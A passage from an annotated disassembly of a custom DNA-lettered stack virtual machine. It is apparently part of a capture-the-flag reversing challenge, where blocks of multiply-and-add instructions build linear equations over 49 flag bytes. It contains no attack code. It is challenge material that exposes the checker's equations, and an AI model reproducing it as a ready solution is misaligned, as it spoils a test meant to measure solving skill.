push(mem[#0292])\n0cf2e : TTGTAATTTTTT     push(#000000a1)\n0cf3a : AG               push(pop() * pop())\n0cf3c : ATCTGAATTTTT     push(mem[#0293])\n0cf48 : TTGGGCTTTTTT     push(#000000d5)\n0cf54 : AG               push(pop() * pop())\n0cf56 : ATTGGAATTTTT     push(mem[#0294])\n0cf62 : TTAGACTTTTTT     push(#000000e6)\n0cf6e : AG               push(pop() * pop())\n0cf70 : ATGGGAATTTTT     push(mem[#0295])\n0cf7c : TTATTCTTTTTT     push(#000000c2)\n0cf88 : AG               push(pop() * pop())\n0cf8a : ATAGGAATTTTT     push(mem[#0296])\n0cf96 : TTGCCTTTTTTT     push(#0000003d)\n0cfa2 : AG               push(pop() * pop())\n0cfa4 : ATCGGAATTTTT     push(mem[#0297])\n0cfb0 : TTGGACTTTTTT     push(#000000e5)\n0cfbc : AG               push(pop() * pop())\n0cfbe : ATTAGAATTTTT     push(mem[#0298])\n0cfca : TTTTACTTTTTT     push(#000000e0)\n0cfd6 : AG               push(pop() * pop())\n0cfd8 : ATGAGAATTTTT     push(mem[#0299])\n0cfe4 : TTCTGTTTTTTT     push(#00000013)\n0cff0 : AG               push(pop() * pop())\n0cff2 : ATAAGAATTTTT     push(mem[#029a])\n0cffe : TTCTCCTTTTTT     push(#000000f3)\n0d00a : AG               push(pop() * pop())\n0d00c : ATCAGAATTTTT     push(mem[#029b])\n0d018 : TTGAACTTTTTT     push(#000000e9)\n0d024 : AG               push(pop() * pop())\n0d026 : ATTCGAATTTTT     push(mem[#029c])\n0d032 : TTCAATTTTTTT     push(#0000002b)\n0d03e : AG               push(pop() * pop())\n0d040 : ATGCGAATTTTT     push(mem[#029d])\n0d04c : TTAAGTTTTTTT     push(#0000001a)\n0d058 : AG               push(pop() * pop())\n0d05a : ATACGAATTTTT     push(mem[#029e])\n0d066 : TTGCTGTTTTTT     push(#0000004d)\n0d072 : AG               push(pop() * pop())\n0d074 : ATCCGAATTTTT     push(mem[#029f])\n0d080 : TTAGTCTTTTTT     push(#000000c6)\n0d08c : AG               push(pop() * pop())\n0d08e : ATTTAAATTTTT     push(mem[#02a0])\n0d09a : TTGGCCTTTTTT     push(#000000f5)\n0d0a6 : AG               push(pop() * pop())\n0d0a8 : ATGTAAATTTTT     push(mem[#02a1])\n0d0b4 : TTGAGATTTTTT     push(#00000099)\n0d0c0 : AG               push(pop() * pop())\n0d0c2 : ATATAAATTTTT     push(mem[#02a2])\n0d0ce : TTTAACTTTTTT     push(#000000e8)\n0d0da : AG               push(pop() * pop())\n0d0dc : ATCTAAATTTTT     push(mem[#02a3])\n0d0e8 : TTAACGTTTTTT     push(#0000007a)\n0d0f4 : AG               push(pop() * pop())\n0d0f6 : ATTGAAATTTTT     push(mem[#02a4])\n0d102 : TTGCCCTTTTTT     push(#000000fd)\n0d10e : AG               push(pop() * pop())\n0d110 : ATGGAAATTTTT     push(mem[#02a5])\n0d11c : TTAGGATTTTTT     push(#00000096)\n0d128 : AG               push(pop() * pop())\n0d12a : ATAGAAATTTTT     push(mem[#02a6])\n0d136 : TTGACGTTTTTT     push(#00000079)\n0d142 : AG               push(pop() * pop())\n0d144 : ATCGAAATTTTT     push(mem[#02a7])\n0d150 : TTACTCTTTTTT     push(#000000ce)\n0d15c : AG               push(pop() * pop())\n0d15e : ATTAAAATTTTT     push(mem[#02a8])\n0d16a : TTTTCATTTTTT     push(#000000b0)\n0d176 : AG               push(pop() * pop())\n0d178 : ATGAAAATTTTT     push(mem[#02a9])\n0d184 : TTTACCTTTTTT     push(#000000f8)\n0d190 : AG               push(pop() * pop())\n0d192 : ATAAAAATTTTT     push(mem[#02aa])\n0d19e : TTGTCATTTTTT     push(#000000b1)\n0d1aa : AG               push(pop() * pop())\n0d1ac : ATCAAAATTTTT     push(mem[#02ab])\n0d1b8 : TTCTAGTTTTTT     push(#00000063)\n0d1c4 : AG               push(pop() * pop())\n0d1c6 : ATTCAAATTTTT     push(mem[#02ac])\n0d1d2 : TTATAGTTTTTT     push(#00000062)\n0d1de : AG               push(pop() * pop())\n0d1e0 : ATGCAAATTTTT     push(mem[#02ad])\n0d1ec : TTAGTCTTTTTT     push(#000000c6)\n0d1f8 : AG               push(pop() * pop())\n0d1fa : ATACAAATTTTT     push(mem[#02ae])\n0d206 : TTATTATTTTTT     push(#00000082)\n0d212 : AG               push(pop() * pop())\n0d214 : ATCCAAATTTTT     push(mem[#02af])\n0d220 : TTGACTTTTTTT     push(#00000039)\n0d22c : AG               push(pop() * pop())\n0d22e : ATTTCAATTTTT     push(mem[#02b0])\n0d23a : TTCTCATTTTTT     push(#000000b3)\n0d246 : AG               push(pop() * pop())\n0d248 : TG               push(pop() + pop())\n0d24a : TG               push(pop() + pop())\n0d24c : TG               push(pop() + pop())\n0d24e : TG               push(pop() + pop())\n0d250 : TG               push(pop() + pop())\n0d252 : TG               push(pop() + pop())\n0d254 : TG               push(pop() + pop())\n0d256 : TG               push(pop() + pop())\n0d258 : TG               push(pop() + pop())\n0d25a : TG               push(pop() + pop())\n0d25c : TG               push(pop() + pop())\n0d25e : TG               push(pop() + pop())\n0d260 : TG               push(pop() + pop())\n0d262 : TG               push(pop() + pop())\n0d264 : TG               push(pop() + pop())\n0d266 : TG               push(pop() + pop())\n0d268 : TG               push(pop() + pop())\n0d26a : TG               push(pop() + pop())\n0d26c : TG               push(pop() + pop())\n0d26e : TG               push(pop() + pop())\n0d270 : TG               push(pop() + pop())\n0d272 : TG               push(pop() + pop())\n0d274 : TG               push(pop() + pop())\n0d276 : TG               push(pop() + pop())\n0d278 : TG               push(pop() + pop())\n0d27a : TG               push(pop() + pop())\n0d27c : TG               push(pop() + pop())\n0d27e : TG               push(pop() + pop())\n0d280 : TG               push(pop() + pop())\n0d282 : TG               push(pop() + pop())\n0d284 : TG               push(pop() + pop())\n0d286 : TG               push(pop() + pop())\n0d288 : TG               push(pop() + pop())\n0d28a : TG               push(pop() + pop())\n0d28c : TG               push(pop() + pop())\n0d28e : TG               push(pop() + pop())\n0d290 : TG               push(pop() + pop())\n0d292 : TG               push(pop() + pop())\n0d294 : TG               push(pop() + pop())\n0d296 : TG               push(pop() + pop())\n0d298 : TG               push(pop() + pop())\n0d29a : TG               push(pop() + pop())\n0d29c : TG               push(pop() + pop())\n0d29e : TG               push(pop() + pop())\n0d2a0 : TG               push(pop() + pop())\n0d2a2 : TG               push(pop() + pop())\n0d2a4 : TG               push(pop() + pop())\n0d2a6 : TG               push(pop() + pop())\n0d2a8 : CTTAGATTGTTT     mem[#1098] := pop()           memory[#01098] := ((flag[0] * 113) + ((flag[1] * 238) + ((flag[2] * 10) + ((flag[3] * 19) + ((flag[4] * 231) + ((flag[5] * 203) + ((flag[6] * 51) + ((flag[7] * 138) + ((flag[8] * 219) + ((flag[9] * 210) + ((flag[10] * 176) + ((flag[11] * 236) + ((flag[12] * 182) + ((flag[13] * 147) + ((flag[14] * 23) + ((flag[15] * 25) + ((flag[16] * 251) + ((flag[17] * 52) + ((flag[18] * 161) + ((flag[19] * 213) + ((flag[20] * 230) + ((flag[21] * 194) + ((flag[22] * 61) + ((flag[23] * 229) + ((flag[24] * 224) + ((flag[25] * 19) + ((flag[26] * 243) + ((flag[27] * 233) + ((flag[28] * 43) + ((flag[29] * 26) + ((flag[30] * 77) + ((flag[31] * 198) + ((flag[32] * 245) + ((flag[33] * 153) + ((flag[34] * 232) + ((flag[35] * 122) + ((flag[36] * 253) + ((flag[37] * 150) + ((flag[38] * 121) + ((flag[39] * 206) + ((flag[40] * 176) + ((flag[41] * 248) + ((flag[42] * 177) + ((flag[43] * 99) + ((flag[44] * 98) + ((flag[45] * 198) + ((flag[46] * 130) + ((flag[47] * 57) + (flag[48] * 179)))))))))))))))))))))))))))))))))))))))))))))))))\n0d2b4 : ATTTTAATTTTT     push(mem[#0280])\n0d2c0 : TTTCGATTTTTT     push(#0000009c)\n0d2cc : AG               push(pop() * pop())\n0d2ce : ATGTTAATTTTT     push(mem[#0281])\n0d2da : TTCCAGTTTTTT     push(#0000006f)\n0d2e6 : AG               push(pop() * pop())\n0d2e8 : ATATTAATTTTT     push(mem[#0282])\n0d2f4 : TTGCCCTTTTTT     push(#000000fd)\n0d300 : AG               push(pop() * pop())\n0d302 : ATCTTAATTTTT     push(mem[#0283])\n0d30e : TTTCTCTTTTTT     push(#000000cc)\n0d31a : AG               push(pop() * pop())\n0d31c : ATTGTAATTTTT     push(mem[#0284])\n0d328 : TTTACATTTTTT     push(#000000b8)\n0d334 : AG               push(pop() * pop())\n0d336 : ATGGTAATTTTT     push(mem[#0285])\n0d342 : TTCCGATTTTTT     push(#0000009f)\n0d34e : AG               push(pop() * pop())\n0d350 : ATAGTAATTTTT     push(mem[#0286])\n0d35c : TTTCGCTTTTTT     push(#000000dc)\n0d368 : AG               push(pop() * pop())\n0d36a : ATCGTAATTTTT     push(mem[#0287])\n0d376 : TTTATGTTTTTT     push(#00000048)\n0d382 : AG               push(pop() * pop())\n0d384 : ATTATAATTTTT     push(mem[#0288])\n0d390 : TTTTCATTTTTT     push(#000000b0)\n0d39c : AG               push(pop() * pop())\n0d39e : ATGATAATTTTT     push(mem[#0289])\n0d3aa : TTTCGATTTTTT     push(#0000009c)\n0d3b6 : AG               push(pop() * pop())\n0d3b8 : ATAATAATTTTT     push(mem[#028a])\n0d3c4 : TTCCTGTTTTTT     push(#0000004f)\n0d3d0 : AG               push(pop() * pop())\n0d3d2 : ATCATAATTTTT     push(mem[#028b])\n0d3de : TTTTAATTTTTT     push(#000000a0)\n0d3ea : AG               push(pop() * pop())\n0d3ec : ATTCTAATTTTT     push(mem[#028c])\n0d3f8 : TTTAATTTTTTT     push(#00000028)\n0d404 : AG               push(pop() * pop())\n0d406 : ATGCTAATTTTT     push(mem[#028d])\n0d412 : TTGATCTTTTTT     push(#000000c9)\n0d41e : AG               push(pop() * pop())\n0d420 : ATACTAATTTTT     push(mem[#028e])\n0d42c : TTCCGGTTTTTT     push(#0000005f)\n0d438 : AG               push(pop() * pop())\n0d43a : ATCCTAATTTTT     push(mem[#028f])\n0d446 : TTCCCTTTTTTT     push(#0000003f)\n0d452 : AG               push(pop() * pop())\n0d454 : ATTTGAATTTTT     push(mem[#0290])\n0d460 : TTTTCCTTTTTT     push(#000000f0)\n0d46c : AG               push(pop() * pop())\n0d46e : ATGTGAATTTTT     push(mem[#0291])\n0d47a : TTGATTTTTTTT     push(#00000009)\n0d486 : AG               push(pop() * pop())\n0d488 : ATATGAATTTTT     push(mem[#0292])\n0d494 : TTTCTATTTTTT     push(#0000008c)\n0d4a0 : AG               push(pop() * pop())\n0d4a2 : ATCTGAATTTTT     push(mem[#0293])\n0d4ae : TTTCATTTTTTT     push(#0000002c)\n0d4ba : AG               push(pop() * pop())\n0d4bc : ATTGGAATTTTT     push(mem[#0294])\n0d4c8 : TTTGATTTTTTT     push(#00000024)\n0d4d4 : AG               push(pop() * pop())\n0d4d6 : ATGGGAATTTTT     push(mem[#0295])\n0d4e2 : TTTCGGTTTTTT     push(#0000005c)\n0d4ee : AG               push(pop() * pop())\n0d4f0 : ATAGGAATTTTT     push(mem[#0296])\n0d4fc : TTGTGTTTTTTT     push(#00000011)\n0d508 : AG               push(pop() * pop())\n0d50a : ATCGGAATTTTT     push(mem[#0297])\n0d516 : TTCACCTTTTTT     push(#000000fb)\n0d522 : AG               push(pop() * pop())\n0d524 : ATTAGAATTTTT     push(mem[#0298])\n0d530 : TTATCATTTTTT     push(#000000b2)\n0d53c : AG               push(pop() * pop())\n0d53e : ATGAGAATTTTT     push(mem[#0299])\n0d54a : TTGTGGTTTTTT     push(#00000051)\n0d556 : AG               push(pop() * pop())\n0d558 : ATAAGAATTTTT     push(mem[#029a])\n0d564 : TTATACTTTTTT     push(#000000e2)\n0d570 : AG               push(pop() * pop())\n0d572 : ATCAGAATTTTT     push(mem[#029b])\n0d57e : TTCAGGTTTTTT     push(#0000005b)\n0d58a : AG               push(pop() * pop())\n0d58c : ATTCGAATTTTT     push(mem[#029c])\n0d598 : TTATTGTTTTTT     push(#00000042)\n0d5a4 : AG               push(pop() * pop())\n0d5a6 : ATGCGAATTTTT     push(mem[#029d])\n0d5b2 : TTATCTTTTTTT     push(#00000032)\n0d5be : AG               push(pop() * pop())\n0d5c0 : ATACGAATTTTT     push(mem[#029e])\n0d5cc : TTGTCCTTTTTT     push(#000000f1)\n0d5d8 : AG               push(pop() * pop())\n0d5da : ATCCGAATTTTT     push(mem[#029f])\n0d5e6 : TTGATGTTTTTT     push(#00000049)\n0d5f2 : AG               push(pop() * pop())\n0d5f4 : ATTTAAATTTTT     push(mem[#02a0])\n0d600 : TTTGGGTTTTTT     push(#00000054)\n0d60c : AG               push(pop() * pop())\n0d60e : ATGTAAATTTTT     push(mem[#02a1])\n0d61a : TTTAGTTTTTTT     push(#00000018)\n0d626 : AG               push(pop() * pop())\n0d628 : ATATAAATTTTT     push(mem[#02a2])\n0d634 : TTTTTGTTTTTT     push(#00000040)\n0d640 : AG               push(pop() * pop())\n0d642 : ATCTAAATTTTT     push(mem[#02a3])\n0d64e : TTCACATTTTTT     push(#000000bb)\n0d65a : AG               push(pop() * pop())\n0d65c : ATTGAAATTTTT     push(mem[#02a4])\n0d668 : TTCAGTTTTTTT     push(#0000001b)\n0d674 : AG               push(pop() * pop())\n0d676 : ATGGAAATTTTT     push(mem[#02a5])\n0d682 : TTTGCTTTTTTT     push(#00000034)\n0d68e : AG               push(pop() * pop())\n0d690 : ATAGAAATTTTT     push(mem[#02a6])\n0d69c : TTGCCTTTTTTT     push(#0000003d)\n0d6a8 : AG               push(pop() * pop())\n0d6aa : ATCGAAATTTTT     push(mem[#02a7])\n0d6b6 : TTGTCCTTTTTT     push(#000000f1)\n0d6c2 : AG               push(pop() * pop())\n0d6c4 : ATTAAAATTTTT     push(mem[#02a8])\n0d6d0 : TTGGCATTTTTT     push(#000000b5)\n0d6dc : AG               push(pop() * pop())\n0d6de : ATGAAAATTTTT     push(mem[#02a9])\n0d6ea : TTCAGATTTTTT     push(#0000009b)\n0d6f6 : AG               push(pop() * pop())\n0d6f8 : ATAAAAATTTTT     push(mem[#02aa])\n0d704 : TTCGTATTTTTT     push(#00000087)\n0d710 : AG               push(pop() * pop())\n0d712 : ATCAAAATTTTT     push(mem[#02ab])\n0d71e : TTCCATTTTTTT     push(#0000002f)\n0d72a : AG               push(pop() * pop())\n0d72c : ATTCAAATTTTT     push(mem[#02ac])\n0d738 : TTGTCGTTTTTT     push(#00000071)\n0d744 : AG               push(pop() * pop())\n0d746 : ATGCAAATTTTT     push(mem[#02ad])\n0d752 : TTCCCATTTTTT     push(#000000bf)\n0d75e : AG               push(pop() * pop())\n0d760 : ATACAAATTTTT     push(mem[#02ae])\n0d76c : TTTAACTTTTTT     push(#000000e8)\n0d778 : AG               push(pop() * pop())\n0d77a : ATCCAAATTTTT     push(mem[#02af])\n0d786 : TTCCTCTTTTTT     push(#000000cf)\n0d792 : AG               push(pop() * pop())\n0d794 : ATTTCAATTTTT     push(mem[#02b0])\n0d7a0 : TTTACTTTTTTT     push(#00000038)\n0d7ac : AG               push(pop() * pop())\n0d7ae : TG               push(pop() + pop())\n0d7b0 : TG               push(pop() + pop())\n0d7b2 : TG               push(pop() + pop())\n0d7b4 : TG               push(pop() + pop())\n0d7b6 : TG               push(pop() + pop())\n0d7b8 : TG               push(pop() + pop())\n0d7ba : TG               push(pop() + pop())\n0d7bc : TG               push(pop() + pop())\n0d7be : TG               push(pop() + pop())\n0d7c0 : TG               push(pop() + pop())\n0d7c2 : TG               push(pop() + pop())\n0d7c4 : TG               push(pop() + pop())\n0d7c6 : TG               push(pop() + pop())\n0d7c8 : TG               push(pop() + pop())\n0d7ca : TG               push(pop() + pop())\n0d7cc : TG               push(pop() + pop())\n0d7ce : TG               push(pop() + pop())\n0d7d0 : TG               push(pop() + pop())\n0d7d2 : TG               push(pop() + pop())\n0d7d4 : TG               push(pop() + pop())\n0d7d6 : TG               push(pop() + pop())\n0d7d8 : TG               push(pop() + pop())\n0d7da : TG               push(pop() + pop())\n0d7dc : TG               push(pop() + pop())\n0d7de : TG               push(pop() + pop())\n0d7e0 : TG               push(pop() + pop())\n0d7e2 : TG               push(pop() + pop())\n0d7e4 : TG               push(pop() + pop())\n0d7e6 : TG               push(pop() + pop())\n0d7e8 : TG               push(pop() + pop())\n0d7ea : TG               push(pop() + pop())\n0d7ec : TG               push(pop() + pop())\n0d7ee : TG               push(pop() + pop())\n0d7f0 : TG               push(pop() + pop())\n0d7f2 : TG               push(pop() + pop())\n0d7f4 : TG               push(pop() + pop())\n0d7f6 : TG               push(pop() + pop())\n0d7f8 : TG               push(pop() + pop())\n0d7fa : TG               push(pop() + pop())\n0d7fc : TG               push(pop() + pop())\n0d7fe : TG               push(pop() + pop())\n0d800 : TG               push(pop() + pop())\n0d802 : TG               push(pop() + pop())\n0d804 : TG               push(pop() + pop())\n0d806 : TG               push(pop() + pop())\n0d808 : TG               push(pop() + pop())\n0d80a : TG               push(pop() + pop())\n0d80c : TG               push(pop() + pop())\n0d80e : CTTCGATTGTTT     mem[#109c] := pop()           memory[#0109c] := ((flag[0] * 156) + ((flag[1] * 111) + ((flag[2] * 253) + ((flag[3] * 204) + ((flag[4] * 184) + ((flag[5] * 159) + ((flag[6] * 220) + ((flag[7] * 72) + ((flag[8] * 176) + ((flag[9] * 156) + ((flag[10] * 79) + ((flag[11] * 160) + ((flag[12] * 40) + ((flag[13] * 201) + ((flag[14] * 95) + ((flag[15] * 63) + ((flag[16] * 240) + ((flag[17] * 9) + ((flag[18] * 140) + ((flag[19] * 44) + ((flag[20] * 36) + ((flag[21] * 92) + ((flag[22] * 17) + ((flag[23] * 251) + ((flag[24] * 178) + ((flag[25] * 81) + ((flag[26] * 226) + ((flag[27] * 91) + ((flag[28] * 66) + ((flag[29] * 50) + ((flag[30] * 241) + ((flag[31] * 73) + ((flag[32] * 84) + ((flag[33] * 24) + ((flag[34] * 64) + ((flag[35] * 187) + ((flag[36] * 27) + ((flag[37] * 52) + ((flag[38] * 61) + ((flag[39] * 241) + ((flag[40] * 181) + ((flag[41] * 155) + ((flag[42] * 135) + ((flag[43] * 47) + ((flag[44] * 113) + ((flag[45] * 191) + ((flag[46] * 232) + ((flag[47] * 207) + (flag[48] * 56)))))))))))))))))))))))))))))))))))))))))))))))))\n0d81a : ATTTTAATTTTT     push(mem[#0280])\n0d826 : TTAACTTTTTTT     push(#0000003a)\n0d832 : AG               push(pop() * pop())\n0d834 : ATGTTAATTTTT     push(mem[#0281])\n0d840 : TTCTCATTTTTT     push(#000000b3)\n0d84c : AG               push(pop() * pop())\n0d84e : ATATTAATTTTT     push(mem[#0282])\n0d85a : TTTCCCTTTTTT     push(#000000fc)\n0d866 : AG               push(pop() * pop())\n0d868 : ATCTTAATTTTT     push(mem[#0283])\n0d874 : TTGTTCTTTTTT     push(#000000c1)\n0d880 : AG               push(pop() * pop())\n0d882 : ATTGTAATTTTT     push(mem[#0284])\n0d88e : TTATCCTTTTTT     push(#000000f2)\n0d89a : AG               push(pop() * pop())\n0d89c : ATGGTAATTTTT     push(mem[#0285])\n0d8a8 : TTGGGGTTTTTT     push(#00000055)\n0d8b4 : AG               push(pop() * pop())\n0d8b6 : ATAGTAATTTTT     push(mem[#0286])\n0d8c2 : TTTAAATTTTTT     push(#000000a8)\n0d8ce : AG               push(pop() * pop())\n0d8d0 : ATCGTAATTTTT     push(mem[#0287])\n0d8dc : TTCACCTTTTTT     push(#000000fb)\n0d8e8 : AG               push(pop() * pop())\n0d8ea : ATTATAATTTTT     push(mem[#0288])\n0d8f6 : TTCCATTTTTTT     push(#0000002f)\n0d902 : AG               push(pop() * pop())\n0d904 : ATGATAATTTTT     push(mem[#0289])\n0d910 : TTTGTCTTTTTT     push(#000000c4)\n0d91c : AG               push(pop() * pop())\n0d91e : ATAATAATTTTT     push(mem[#028a])\n0d92a : TTCTGATTTTTT     push(#00000093)\n0d936 : AG               push(pop() * pop())\n0d938 : ATCATAATTTTT     push(mem[#028b])\n0d944 : TTAGAATTTTTT     push(#000000a6)\n0d950 : AG               push(pop() * pop())\n0d952 : ATTCTAATTTTT     push(mem[#028c])\n0d95e : TTCCGCTTTTTT     push(#000000df)\n0d96a : AG               push(pop() * pop())\n0d96c : ATGCTAATTTTT     push(mem[#028d])\n0d978 : TTCACCTTTTTT     push(#000000fb)\n0d984 : AG               push(pop() * pop())\n0d986 : ATACTAATTTTT     push(mem[#028e])\n0d992 : TTAAATTTTTTT     push(#0000002a)\n0d99e : AG               push(pop() * pop())\n0d9a0 : ATCCTAATTTTT     push(mem[#028f])\n0d9ac : TTCGCTTTTTTT     push(#00000037)\n0d9b8 : AG               push(pop() * pop())\n0d9ba : ATTTGAATTTTT     push(mem[#0290])\n0d9c6 : TTTCGTTTTTTT     push(#0000001c)\n0d9d2 : AG               push(pop() * pop())\n0d9d4 : ATGTGAATTTTT     push(mem[#0291])\n0d9e0 : TTGACATTTTTT     push(#000000b9)\n0d9ec : AG               push(pop() * pop())\n0d9ee : ATATGAATTTTT     push(mem[#0292])\n0d9fa : TTAGATTTTTTT     push(#00000026)\n0da06 : AG               push(pop() * pop())\n0da08 : ATCTGAATTTTT     push(mem[#0293])\n0da14 : TTCGGTTTTTTT     push(#00000017)\n0da20 : AG               push(pop() * pop())\n0da22 : ATTGGAATTTTT     push(mem[#0294])\n0da2e : TTAGACTTTTTT     push(#000000e6)\n0da3a : AG               push(pop() * pop())\n0da3c : ATGGGAATTTTT     push(mem[#0295])\n0da48 : TTCCACTTTTTT     push(#000000ef)\n0da54 : AG               push(pop() * pop())\n0da56 : ATAGGAATTTTT     push(mem[#0296])\n0da62 : TTGAAGTTTTTT     push(#00000069)\n0da6e : AG               push(pop() * pop())\n0da70 : ATCGGAATTTTT     push(mem[#0297])\n0da7c : TTACACTTTTTT     push(#000000ee)\n0da88 : AG               push(pop() * pop())\n0da8a : ATTAGAATTTTT     push(mem[#0298])\n0da96 : TTGAGCTTTTTT     push(#000000d9)\n0daa2 : AG               push(pop() * pop())\n0daa4 : ATGAGAATTTTT     push(mem[#0299])\n0dab0 : TTGGTCTTTTTT     push(#000000c5)\n0dabc : AG               push(pop() * pop())\n0dabe : ATAAGAATTTTT     push(mem[#029a])\n0daca : TTACACTTTTTT     push(#000000ee)\n0dad6 : AG               push(pop() * pop())\n0dad8 : ATCAGAATTTTT     push(mem[#029b])\n0dae4 : TTCAAGTTTTTT     push(#0000006b)\n0daf0 : AG               push(pop() * pop())\n0daf2 : ATTCGAATTTTT     push(mem[#029c])\n0dafe : TTATCATTTTTT     push(#000000b2)\n0db0a : AG               push(pop() * pop())\n0db0c : ATGCGAATTTTT     push(mem[#029d])\n0db18 : TTTGGCTTTTTT     push(#000000d4)\n0db24 : AG               push(pop() * pop())\n0db26 : ATACGAATTTTT     push(mem[#029e])\n0db32 : TTCAGTTTTTTT     push(#0000001b)\n0db3e : AG               push(pop() * pop())\n0db40 : ATCCGAATTTTT     push(mem[#029f])\n0db4c : TTCCGGTTTTTT     push(#0000005f)\n0db58 : AG               push(pop() * pop())\n0db5a : ATTTAAATTTTT     push(mem[#02a0])\n0db66 : TTGCTGTTTTTT     push(#0000004d)\n0db72 : AG               push(pop() * pop())\n0db74 : ATGTAAATTTTT     push(mem[#02a1])\n0db80 : TTAGTATTTTTT     push(#00000086)\n0db8c : AG               push(pop() * pop())\n0db8e : ATATAAATTTTT     push(mem[#02a2])\n0db9a : TTCCGATTTTTT     push(#0000009f)\n0dba6 : AG               push(pop() * pop())\n0dba8 : ATCTAAATTTTT     push(mem[#02a3])\n0dbb4 : TTGCCTTTTTTT     push(#0000003d)\n0dbc0 : AG               push(pop() * pop())\n0dbc2 : ATTGAAATTTTT     push(mem[#02a4])\n0dbce : TTGGACTTTTTT     push(#000000e5)\n0dbda : AG               push(pop() * pop())\n0dbdc : ATGGAAATTTTT     push(mem[#02a5])\n0dbe8 : TTCGTTTTTTTT     push(#00000007)\n0dbf4 : AG               push(pop() * pop())\n0dbf6 : ATAGAAATTTTT     push(mem[#02a6])\n0dc02 : TTGGGGTTTTTT     push(#00000055)\n0dc0e : AG               push(pop() * pop())\n0dc10 : ATCGAAATTTTT     push(mem[#02a7])\n0dc1c : TTTTAGTTTTTT     push(#00000060)\n0dc28 : AG               push(pop() * pop())\n0dc2a : ATTAAAATTTTT     push(mem[#02a8])\n0dc36 : TTCGGGTTTTTT     push(#00000057)\n0dc42 : AG               push(pop() * pop())\n0dc44 : ATGAAAATTTTT     push(mem[#02a9])\n0dc50 : TTTAACTTTTTT     push(#000000e8)\n0dc5c : AG               push(pop() * pop())\n0dc5e : ATAAAAATTTTT     push(mem[#02aa])\n0dc6a : TTGCCGTTTTTT     push(#0000007d)\n0dc76 : AG               push(pop() * pop())\n0dc78 : ATCAAAATTTTT     push(mem[#02ab])\n0dc84 : TTGAGGTTTTTT     push(#00000059)\n0dc90 : AG               push(pop() * pop())\n0dc92 : ATTCAAATTTTT     push(mem[#02ac])\n0dc9e : TTTCATTTTTTT     push(#0000002c)\n0dcaa : AG               push(pop() * pop())\n0dcac : ATGCAAATTTTT     push(mem[#02ad])\n0dcb8 : TTTAGATTTTTT     push(#00000098)\n0dcc4 : AG               push(pop() * pop())\n0dcc6 : ATACAAATTTTT     push(mem[#02ae])\n0dcd2 : TTATTGTTTTTT     push(#00000042)\n0dcde : AG               push(pop() * pop())\n0dce0 : ATCCAAATTTTT     push(mem[#02af])\n0dcec : TTGCCTTTTTTT     push(#0000003d)\n0dcf8 : AG               push(pop() * pop())\n0dcfa : ATTTCAATTTTT     push(mem[#02b0])\n0dd06 : TTCCGCTTTTTT     push(#000000df)\n0dd12 : AG               push(pop() * pop())\n0dd14 : TG               push(pop() + pop())\n0dd16 : TG               push(pop() + pop())\n0dd18 : TG               push(pop() + pop())\n0dd1a : TG               push(pop() + pop())\n0dd1c : TG               push(pop() + pop())\n0dd1e : TG               push(pop() + pop())\n0dd20 : TG               push(pop() + pop())\n0dd22 : TG               push(pop() + pop())\n0dd24 : TG               push(pop() + pop())\n0dd26 : TG               push(pop() + pop())\n0dd28 : TG               push(pop() + pop())\n0dd2a : TG               push(pop() + pop())\n0dd2c : TG               push(pop() + pop())\n0dd2e : TG               push(pop() + pop())\n0dd30 : TG               push(pop() + pop())\n0dd32 : TG               push(pop() + pop())\n0dd34 : TG               push(pop() + pop())\n0dd36 : TG               push(pop() + pop())\n0dd38 : TG               push(pop() + pop())\n0dd3a : TG               push(pop() + pop())\n0dd3c : TG               push(pop() + pop())\n0dd3e : TG               push(pop() + pop())\n0dd40 : TG               push(pop() + pop())\n0dd42 : TG               push(pop() + pop())\n0dd44 : TG               push(pop() + pop())\n0dd46 : TG               push(pop() + pop())\n0dd48 : TG               push(pop() + pop())\n0dd4a : TG               push(pop() + pop())\n0dd4c : TG               push(pop() + pop())\n0dd4e : TG               push(pop() + pop())\n0dd50 : TG               push(pop() + pop())\n0dd52 : TG               push(pop() + pop())\n0dd54 : TG               push(pop() + pop())\n0dd56 : TG               push(pop() + pop())\n0dd58 : TG               push(pop() + pop())\n0dd5a : TG               push(pop() + pop())\n0dd5c : TG               push(pop() + pop())\n0dd5e : TG               push(pop() + pop())\n0dd60 : TG               push(pop() + pop())\n0dd62 : TG               push(pop() + pop())\n0dd64 : TG               push(pop() + pop())\n0dd66 : TG               push(pop() + pop())\n0dd68 : TG               push(pop() + pop())\n0dd6a : TG               push(pop() + pop())\n0dd6c : TG               push(pop() + pop())\n0dd6e : TG               push(pop() + pop())\n0dd70 : TG               push(pop() + pop())\n0dd72 : TG               push(pop() + pop())\n0dd74 : CTTTAATTGTTT     mem[#10a0] := pop()           memory[#010a0] := ((flag[0] * 58) + ((flag[1] * 179) + ((flag[2] * 252) + ((flag[3] * 193) + ((flag[4] * 242) + ((flag[5] * 85) + ((flag[6] * 168) + ((flag[7] * 251) + ((flag[8] * 47) + ((flag[9] * 196) + ((flag[10] * 147) + ((flag[11] * 166) + ((flag[12] * 223) + ((flag[13] * 251) + ((flag[14] * 42) + ((flag[15] * 55) + ((flag[16] * 28) + ((flag[17] * 185) + ((flag[18] * 38) + ((flag[19] * 23) + ((flag[20] * 230) + ((flag[21] * 239) + ((flag[22] * 105) + ((flag[23] * 238) + ((flag[24] * 217) + ((flag[25] * 197) + ((flag[26] * 238) + ((flag[27] * 107) + ((flag[28] * 178) + ((flag[29] * 212) + ((flag[30] * 27) + ((flag[31] * 95) + ((flag[32] * 77) + ((flag[33] * 134) + ((flag[34] * 159) + ((flag[35] * 61) + ((flag[36] * 229) + ((flag[37] * 7) + ((flag[38] * 85) + ((flag[39] * 96) + ((flag[40] * 87) + ((flag[41] * 232) + ((flag[42] * 125) + ((flag[43] * 89) + ((flag[44] * 44) + ((flag[45] * 152) + ((flag[46] * 66) + ((flag[47] * 61) + (flag[48] * 223)))))))))))))))))))))))))))))))))))))))))))))))))\n0dd80 : ATTTTAATTTTT     push(mem[#0280])\n0dd8c : TTGGCATTTTTT     push(#000000b5)\n0dd98 : AG               push(pop() * pop())\n0dd9a : ATGTTAATTTTT     push(mem[#0281])\n0dda6 : TTGCTGTTTTTT     push(#0000004d)\n0ddb2 : AG               push(pop() * pop())\n0ddb4 : ATATTAATTTTT     push(mem[#0282])\n0ddc0 : TTATCTTTTTTT     push(#00000032)\n0ddcc : AG               push(pop() * pop())\n0ddce : ATCTTAATTTTT     push(mem[#0283])\n0ddda : TTCCCGTTTTTT     push(#0000007f)\n0dde6 : AG               push(pop() * pop())\n0dde8 : ATTGTAATTTTT     push(mem[#0284])\n0ddf4 : TTCGGCTTTTTT     push(#000000d7)\n0de00 : AG               push(pop() * pop())\n0de02 : 